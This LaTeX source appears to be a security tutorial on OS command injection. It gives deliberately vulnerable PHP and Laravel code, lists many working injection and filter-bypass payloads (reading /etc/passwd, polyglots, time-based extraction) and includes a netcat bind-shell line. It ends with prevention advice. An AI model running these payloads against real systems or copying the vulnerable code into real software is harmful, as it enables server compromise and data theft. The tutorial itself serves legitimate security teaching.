@@ -1,0 +1,843 @@
+\documentclass[12pt]{article}
+
+\usepackage[a4paper,margin=0.5in]{geometry}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{hyperref}
+\usepackage{enumitem}
+\usepackage{titlesec}
+\usepackage{tcolorbox}
+\usepackage{longtable}
+\usepackage{multicol}
+\usepackage{booktabs}
+\usepackage{amssymb}
+
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+\definecolor{infoboxcolor}{rgb}{0.9,0.95,1}
+\definecolor{warningcolor}{rgb}{1,0.95,0.9}
+\definecolor{criticalcolor}{rgb}{1,0.9,0.9}
+
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{blue},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    captionpos=b,
+    keepspaces=true,
+    numbers=left,
+    numbersep=5pt,
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    tabsize=2
+}
+
+\lstset{style=mystyle}
+
+% Custom boxes
+\newtcolorbox{infobox}[1][]{colback=infoboxcolor,colframe=blue!50!black,title=#1,boxrule=1pt}
+\newtcolorbox{warningbox}[1][]{colback=warningcolor,colframe=orange!50!black,title=#1,boxrule=1pt}
+\newtcolorbox{criticalbox}[1][]{colback=criticalcolor,colframe=red!50!black,title=#1,boxrule=1pt}
+
+\title{OS Command Injection Complete Guide}
+\author{Eyad Islam El-Taher}
+\date{\today}
+
+\begin{document}
+
+\maketitle
+\tableofcontents
+\newpage
+
+% ==================================================
+\section{What is OS Command Injection}
+
+\subsection{Definition}
+
+OS command injection (also known as shell injection) is a vulnerability that allows an attacker to execute operating system (OS) commands on the server running an application. This typically leads to full compromise of the application and its data.
+
+\subsection{Impact}
+
+An attacker can leverage OS command injection to:
+
+\begin{itemize}
+    \item Execute arbitrary commands on the server
+    \item Read, write, and delete sensitive files
+    \item Compromise other parts of the hosting infrastructure
+    \item Use trust relationships to pivot to other systems
+    \item Install backdoors and malware
+    \item Completely take over the server
+\end{itemize}
+
+\subsection{How It Works}
+
+When an application passes unsafe user-supplied data (forms, cookies, HTTP headers, etc.) to a system shell, command injection can occur.
+
+\begin{infobox}[Core Concept]
+The application constructs a system command using user input without proper validation or sanitization. The attacker injects shell metacharacters to modify the command's behavior.
+\end{infobox}
+
+\subsection{Example Scenario}
+
+Consider a shopping application that lets users view whether an item is in stock:
+
+\begin{lstlisting}
+https://insecure-website.com/stockStatus?productID=381&storeID=29
+\end{lstlisting}
+
+The application calls a shell command:
+\begin{lstlisting}[language=bash]
+stockreport.pl 381 29
+\end{lstlisting}
+
+An attacker submits:
+\begin{lstlisting}
+https://insecure-website.com/stockStatus?productID=381&echo+injected&storeID=29
+\end{lstlisting}
+
+The executed command becomes:
+\begin{lstlisting}[language=bash]
+stockreport.pl & echo injected & 29
+\end{lstlisting}
+
+% ==================================================
+\section{Where to Find OS Command Injection}
+
+\subsection{Common Locations}
+
+\begin{itemize}
+    \item Ping or network diagnostic tools
+    \item File upload/download functionality
+    \item Email sending features
+    \item System monitoring interfaces
+    \item Backup and restore functions
+    \item Log viewing/exporting features
+    \item Archive extraction (zip, tar, etc.)
+    \item PDF generation from templates
+    \item Image processing (converting, resizing)
+    \item DNS lookup tools
+\end{itemize}
+
+\subsection{Common Parameter Names}
+
+\begin{multicols}{3}
+\begin{itemize}
+    \item ping
+    \item host
+    \item ip
+    \item address
+    \item domain
+    \item url
+    \item file
+    \item path
+    \item cmd
+    \item command
+    \item exec
+    \item system
+    \item shell
+    \item output
+    \item log
+    \item backup
+    \item restore
+\end{itemize}
+\end{multicols}
+
+% ==================================================
+\section{Vulnerable Code Examples}
+
+\subsection{PHP Command Injection}
+
+\begin{lstlisting}[language=PHP, caption=Vulnerable PHP Code]
+<?php
+// Example 1: Direct system call with user input
+$ip = $_GET['ip'];
+system("ping -c 4 " . $ip);
+
+// Example 2: Using exec
+$file = $_GET['file'];
+exec("cat " . $file, $output);
+print_r($output);
+
+// Example 3: Using shell_exec
+$domain = $_GET['domain'];
+$result = shell_exec("nslookup " . $domain);
+echo $result;
+
+// Example 4: Using passthru
+$cmd = $_GET['cmd'];
+passthru($cmd);
+
+// Example 5: Using backticks
+$host = $_GET['host'];
+$output = `ping -c 4 $host`;
+echo $output;
+?>
+\end{lstlisting}
+
+\subsection{Laravel Command Injection}
+
+\begin{lstlisting}[language=PHP, caption=Vulnerable Laravel Code]
+<?php
+namespace App\Http\Controllers;
+
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Process;
+
+class DiagnosticController extends Controller
+{
+    // Vulnerable: Direct command execution
+    public function ping(Request $request)
+    {
+        $ip = $request->input('ip');
+        // Dangerous: User input directly in command
+        $output = shell_exec("ping -c 4 " . $ip);
+        return view('ping', ['output' => $output]);
+    }
+    
+    // Vulnerable: Using Process facade
+    public function scan(Request $request)
+    {
+        $host = $request->input('host');
+        // Dangerous: No input validation
+        $process = Process::run("nmap -sP " . $host);
+        return $process->output();
+    }
+    
+    // Vulnerable: Artisan command execution
+    public function backup(Request $request)
+    {
+        $db = $request->input('database');
+        // Dangerous: Command injection via custom Artisan command
+        \Artisan::call("db:backup --database={$db}");
+        return "Backup completed";
+    }
+}
+?>
+\end{lstlisting}
+
+\subsection{Attack Example}
+
+\begin{lstlisting}
+# Normal request
+GET /ping.php?ip=8.8.8.8 HTTP/1.1
+
+# Malicious request
+GET /ping.php?ip=8.8.8.8;%20cat%20/etc/passwd HTTP/1.1
+
+# The executed command becomes:
+ping -c 4 8.8.8.8; cat /etc/passwd
+\end{lstlisting}
+
+% ==================================================
+\section{Detection of OS Command Injection}
+
+\subsection{Basic Detection Payloads}
+
+\begin{lstlisting}[language=bash]
+# Simple echo test (in-band)
+; echo test
+| echo test
+|| echo test
+& echo test
+&& echo test
+
+# Time delay test (blind)
+; sleep 5
+| sleep 5
+|| sleep 5
+& sleep 5
+&& sleep 5
+
+# DNS exfiltration test (blind)
+; nslookup test.collaborator.com
+| nslookup test.collaborator.com
+\end{lstlisting}
+
+\subsection{Command Separators}
+
+\begin{longtable}{|l|l|l|}
+\hline
+\textbf{Separator} & \textbf{Description} & \textbf{Example} \\
+\hline
+; & Execute sequentially & \verb|cmd1; cmd2| \\
+\hline
+\& & Execute in background & \verb|cmd1 \& cmd2| \\
+\hline
+\&\& & Execute if previous succeeds & \verb|cmd1 \&\& cmd2| \\
+\hline
+$|$ & Pipe output & \verb|cmd1 | cmd2| \\
+\hline
+$||$ & Execute if previous fails & \verb|cmd1 || cmd2| \\
+\hline
+\textbackslash n & Newline & \verb|cmd1\ncmd2| \\
+\hline
+\end{longtable}
+
+\subsection{Detection Steps}
+
+\begin{enumerate}
+    \item Identify input parameters
+    \item Submit command separators (;, \&, |, etc.)
+    \item Observe response for changes
+    \item Test with benign commands (echo, ping, sleep)
+    \item Check for time delays (blind injection)
+    \item Monitor out-of-band interactions
+\end{enumerate}
+
+% ==================================================
+\section{When to Search for Command Injection}
+
+\subsection{Indicators}
+
+Look for command injection when:
+
+\begin{itemize}
+    \item Application interacts with system commands
+    \item Network diagnostic features (ping, traceroute, nslookup)
+    \item File operations with user-supplied filenames
+    \item Email functionality with user-controlled addresses
+    \item Archive extraction with user-supplied archive names
+    \item Log viewing/exporting features
+    \item System monitoring interfaces
+\end{itemize}
+
+% ==================================================
+\section{Filter Bypasses}
+
+\subsection{Bypass Without Space}
+
+\begin{longtable}{|p{5cm}|p{10cm}|}
+\hline
+\textbf{Technique} & \textbf{Example} \\
+\hline
+\verb|${IFS}| & \verb|cat${IFS}/etc/passwd| \\
+\hline
+\verb|$IFS| & \verb|cat$IFS/etc/passwd| \\
+\hline
+Brace expansion & \verb|{cat,/etc/passwd}| \\
+\hline
+Input redirection & \verb|cat</etc/passwd| \\
+\hline
+Tab character & \verb|cat%09/etc/passwd| \\
+\hline
+ANSI-C quoting & \verb|X=$'uname\x20-a' \&\& $X| \\
+\hline
+Windows substring & \verb|ping%CommonProgramFiles:~10,-18%127.0.0.1| \\
+\hline
+\end{longtable}
+
+\subsection{Bypass With A Line Return}
+
+\begin{lstlisting}[language=bash]
+# Commands can be run in sequence with newlines
+original_cmd_by_server
+ls
+whoami
+\end{lstlisting}
+
+\subsection{Bypass With Backslash Newline}
+
+\begin{lstlisting}[language=bash]
+# Commands broken into parts using backslash + newline
+$ cat /et\
+c/pa\
+sswd
+
+# URL encoded form
+cat%20/et%5C%0Ac/pa%5C%0Asswd
+\end{lstlisting}
+
+\subsection{Bypass With Tilde Expansion}
+
+\begin{lstlisting}[language=bash]
+echo ~+      # Current directory
+echo ~-      # Previous directory
+cd ~         # Home directory
+\end{lstlisting}
+
+\subsection{Bypass With Brace Expansion}
+
+\begin{lstlisting}[language=bash]
+{,ls,-la}
+{,ifconfig}
+{,ifconfig,eth0}
+{,/usr/bin/id}
+{cat,/etc/passwd}
+\end{lstlisting}
+
+\subsection{Bypass Characters Filter}
+
+\begin{lstlisting}[language=bash]
+# Generate slash using HOME variable
+swissky@crashlab:~$ echo ${HOME:0:1}
+/
+
+swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
+root:x:0:0:root:/root:/bin/bash
+
+# Using tr to generate slash
+swissky@crashlab:~$ echo . | tr '!-0' '"-1'
+/
+
+swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+\end{lstlisting}
+
+\subsection{Bypass Characters Filter Via Hex Encoding}
+
+\begin{lstlisting}[language=bash]
+# Using echo -e
+swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+/etc/passwd
+
+swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+root:x:0:0:root:/root:/bin/bash
+
+# Using variable
+swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
+
+# Using xxd
+swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
+/etc/passwd
+
+swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
+\end{lstlisting}
+
+\subsection{Bypass With Single Quote}
+
+\begin{lstlisting}[language=bash]
+w'h'o'am'i
+wh''oami
+'w'hoami
+whoa'm'i
+\end{lstlisting}
+
+\subsection{Bypass With Double Quote}
+
+\begin{lstlisting}[language=bash]
+w"h"o"am"i
+wh""oami
+"wh"oami
+who"am"i
+\end{lstlisting}
+
+\subsection{Bypass With Backticks}
+
+\begin{lstlisting}[language=bash]
+wh``oami
+who`echo am`i
+`echo whoami`
+\end{lstlisting}
+
+\subsection{Bypass With Backslash and Slash}
+
+\begin{lstlisting}[language=bash]
+w\ho\am\i
+/\b\i\n/////s\h
+c\a\t /e\t\c\/p\a\s\s\w\d
+\end{lstlisting}
+
+\subsection{Bypass With \$@}
+
+\begin{lstlisting}[language=bash]
+who$@ami
+who$*ami
+echo whoami|$0
+\end{lstlisting}
+
+\subsection{Bypass With \$()}
+
+\begin{lstlisting}[language=bash]
+who$()ami
+who$(echo am)i
+who`echo am`i
+$(echo whoami)
+\end{lstlisting}
+
+\subsection{Bypass With Variable Expansion}
+
+\begin{lstlisting}[language=bash]
+# Using wildcards
+/???/??t /???/p??s??
+/???/cat /???/passwd
+
+# Using variable substitution
+test=/ehhh/hmtc/pahhh/hmsswd
+cat ${test//hhh\/hm/}
+cat ${test//hh??hm/}
+\end{lstlisting}
+
+\subsection{Bypass With Wildcards}
+
+\begin{lstlisting}[language=bash]
+# Linux
+/bin/cat /etc/passwd
+/???/??t /???/p??s??
+/???/cat /???/passwd
+
+# Windows (PowerShell)
+powershell C:\*\*2\n??e*d.*?    # notepad
+@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e  # calc
+\end{lstlisting}
+
+\subsection{Bypass With Random Case}
+
+\begin{warningbox}[Windows Only]
+Windows does not distinguish between uppercase and lowercase letters when interpreting commands or file paths.
+\end{warningbox}
+
+\begin{lstlisting}[language=sh]
+wHoAmI
+WHoami
+whoAMI
+cMd
+cAlC
+\end{lstlisting}
+
+% ==================================================
+\section{Data Exfiltration}
+
+\subsection{Time Based Data Exfiltration}
+
+Extract data character by character and detect correct values based on delay:
+
+\begin{lstlisting}[language=bash]
+# Check if first character of username is 's' (true - 5 second delay)
+time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+real    0m5.007s
+
+# Check if first character of username is 'a' (false - no delay)
+time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
+real    0m0.002s
+
+# Complete extraction script
+for i in $(seq 1 20); do
+    for c in {a..z}; do
+        if [ $(whoami|cut -c $i) == $c ]; then
+            echo "Character $i: $c"
+            break
+        fi
+    done
+done
+\end{lstlisting}
+
+\newpage
+% ==================================================
+\section{Polyglot Command Injection}
+
+A polyglot is code that is valid and executable in multiple contexts simultaneously.
+
+\subsection{Example 1}
+
+\begin{lstlisting}[language=bash]
+# Polyglot payload
+1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+
+# Works in different contexts:
+echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+\end{lstlisting}
+
+\subsection{Example 2}
+
+\begin{lstlisting}[language=bash]
+# Advanced polyglot
+/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+
+# Works in comments and quoted contexts
+echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
+\end{lstlisting}
+
+% ==================================================
+\section{Tricks}
+
+\subsection{Backgrounding Long Running Commands}
+
+Sometimes long-running commands get killed when the parent process times out. Use \texttt{nohup} to keep processes running:
+
+\begin{lstlisting}[language=bash]
+# Keep process running after parent exits
+nohup sleep 120 > /dev/null &
+nohup python -m http.server 8080 > /dev/null &
+nohup nc -lvp 4444 -e /bin/bash > /dev/null &
+\end{lstlisting}
+
+\subsection{Remove Arguments After Injection}
+
+In Unix-like systems, \texttt{--} signifies the end of command options:
+
+\begin{lstlisting}[language=bash]
+# Original command
+command -- user-input
+
+# After injection
+command -- --help
+command -- ; whoami
+command -- && id
+\end{lstlisting}
+
+% ==================================================
+\section{Examples}
+
+\subsection{Example 1: Simple Command Injection}
+
+\begin{lstlisting}
+GET /stockStatus?productID=381&echo+injected&storeID=29 HTTP/1.1
+Host: vulnerable.com
+
+# Response shows "injected" in output
+Error - productID was not provided
+injected
+29: command not found
+\end{lstlisting}
+
+\subsection{Example 2: Blind Time Delay}
+
+\begin{lstlisting}
+POST /feedback HTTP/1.1
+Host: vulnerable.com
+Content-Type: application/x-www-form-urlencoded
+
+email=x||ping+-c+10+127.0.0.1||&message=test
+
+# Response takes 10 seconds to return
+\end{lstlisting}
+
+\subsection{Example 3: Output Redirection}
+
+\begin{lstlisting}[language=bash]
+# Inject command that writes output to web root
+& whoami > /var/www/static/whoami.txt &
+
+# Retrieve the output
+GET /whoami.txt HTTP/1.1
+Host: vulnerable.com
+
+Response: www-data
+\end{lstlisting}
+
+
+% ==================================================
+\section{Methodology}
+
+\subsection{Testing Workflow}
+
+\begin{enumerate}
+    \item \textbf{Identify input vectors}
+    \begin{itemize}
+        \item All parameters (GET, POST, cookies, headers)
+        \item File uploads (filenames)
+        \item API endpoints
+    \end{itemize}
+    
+    \item \textbf{Test command separators}
+    \begin{itemize}
+        \item Submit \texttt{;}, \texttt{\&}, \texttt{|}, \texttt{||}, \texttt{\&\&}
+        \item Observe error messages or behavior changes
+    \end{itemize}
+    
+    \item \textbf{Test benign commands}
+    \begin{itemize}
+        \item \texttt{echo test123}
+        \item \texttt{sleep 5} (time delay)
+        \item \texttt{nslookup collaborator.com} (OOB)
+    \end{itemize}
+    
+    \item \textbf{Extract information}
+    \begin{itemize}
+        \item In-band: Read command output directly
+        \item Blind: Use time delays or DNS exfiltration
+    \end{itemize}
+    
+    \item \textbf{Escalate privilege}
+    \begin{itemize}
+        \item Write web shells
+        \item Create reverse shells
+        \item Extract sensitive files
+    \end{itemize}
+\end{enumerate}
+
+\subsection{Testing Checklist}
+
+\begin{longtable}{|p{10cm}|p{3cm}|}
+\hline
+\textbf{Test} & \textbf{Status} \\
+\hline
+Identify all input parameters & $\square$ \\
+\hline
+Test command separators (;, \&, |) & $\square$ \\
+\hline
+Test echo payload for in-band detection & $\square$ \\
+\hline
+Test sleep payload for time delay & $\square$ \\
+\hline
+Test DNS exfiltration payload & $\square$ \\
+\hline
+Test output redirection to web root & $\square$ \\
+\hline
+Test space bypass techniques & $\square$ \\
+\hline
+Test character filter bypasses & $\square$ \\
+\hline
+Extract current username & $\square$ \\
+\hline
+Extract system information & $\square$ \\
+\hline
+Read sensitive files & $\square$ \\
+\hline
+Establish reverse shell & $\square$ \\
+\hline
+\end{longtable}
+
+% ==================================================
+\section{Prevention and Mitigation}
+
+\subsection{Primary Prevention Strategies}
+
+\begin{criticalbox}[The Golden Rule]
+The most effective way to prevent OS command injection vulnerabilities is to \textbf{never call out to OS commands from application-layer code} when user input is involved.
+\end{criticalbox}
+
+\subsection{Use Safe APIs Instead}
+
+\begin{lstlisting}[language=PHP]
+// BAD: Calling system command
+system("ping -c 4 " . $ip);
+
+// GOOD: Use PHP's built-in functions
+$socket = socket_create(AF_INET, SOCK_RAW, 1);
+// or use filter_var with FILTER_VALIDATE_IP
+
+// BAD: Using exec for file operations
+exec("cat " . $filename);
+
+// GOOD: Use PHP's file functions
+$content = file_get_contents($filename);
+\end{lstlisting}
+
+\subsection{Input Validation (Whitelist)}
+
+\begin{lstlisting}[language=PHP]
+<?php
+// Validate IP address format
+if (filter_var($ip, FILTER_VALIDATE_IP)) {
+    system("ping -c 4 " . escapeshellcmd($ip));
+} else {
+    die("Invalid IP address");
+}
+
+// Validate alphanumeric input
+if (ctype_alnum($username)) {
+    system("finger " . escapeshellcmd($username));
+} else {
+    die("Invalid username");
+}
+
+// Whitelist allowed values
+$allowed_commands = ['ping', 'traceroute', 'nslookup'];
+if (in_array($command, $allowed_commands)) {
+    system($command . " " . escapeshellarg($target));
+}
+?>
+\end{lstlisting}
+
+\subsection{Laravel Specific Prevention}
+
+\begin{lstlisting}[language=PHP]
+<?php
+use Illuminate\Support\Facades\Process;
+use Illuminate\Validation\Rule;
+
+class DiagnosticController extends Controller
+{
+    public function ping(Request $request)
+    {
+        // Validate input
+        $validated = $request->validate([
+            'ip' => 'required|ipv4'
+        ]);
+        
+        // Use escapeshellcmd for additional safety
+        $ip = escapeshellcmd($validated['ip']);
+        
+        // Alternative: Use Process facade with array syntax (safer)
+        $process = Process::run(['ping', '-c', '4', $ip]);
+        
+        return $process->output();
+    }
+    
+    public function backup(Request $request)
+    {
+        // Use validation rule with whitelist
+        $request->validate([
+            'database' => ['required', Rule::in(['main', 'logs', 'cache'])]
+        ]);
+        
+        // Now safe to use
+        \Artisan::call("db:backup --database={$request->database}");
+    }
+}
+?>
+\end{lstlisting}
+
+\subsection{Escaping Functions}
+
+\begin{longtable}{|l|l|}
+\hline
+\textbf{Language} & \textbf{Escaping Function} \\
+\hline
+PHP & escapeshellarg(), escapeshellcmd() \\
+\hline
+Python & shlex.quote() \\
+\hline
+Java & ProcessBuilder (handles escaping automatically) \\
+\hline
+Node.js & execFile() instead of exec() \\
+\hline
+Ruby & Shellwords.escape() \\
+\hline
+\end{longtable}
+
+\subsection{Use Parameterized Commands}
+
+\begin{lstlisting}[language=python]
+# Python - BAD
+import os
+os.system(f"ping -c 4 {user_input}")
+
+# Python - GOOD (uses array to avoid shell interpretation)
+import subprocess
+subprocess.run(["ping", "-c", "4", user_input])
+
+# Node.js - BAD
+const { exec } = require('child_process');
+exec(`ping -c 4 ${userInput}`);
+
+# Node.js - GOOD
+const { execFile } = require('child_process');
+execFile('ping', ['-c', '4', userInput]);
+\end{lstlisting}
+
+\begin{infobox}[Key Takeaway]
+The most effective prevention is to avoid calling OS commands altogether. When unavoidable:
+\begin{enumerate}
+    \item Whitelist allowed inputs
+    \item Validate input format
+    \item Use escapeshellarg()/escapeshellcmd()
+    \item Run with least privilege
+    \item Log suspicious attempts
+\end{enumerate}
+\end{infobox}
+
+\begin{criticalbox}[Remember]
+Never attempt to sanitize input by blacklisting dangerous characters. Attackers are creative and will find ways to bypass your filters. Always use whitelisting and proper escaping functions.
+\end{criticalbox}
+
+\end{document}
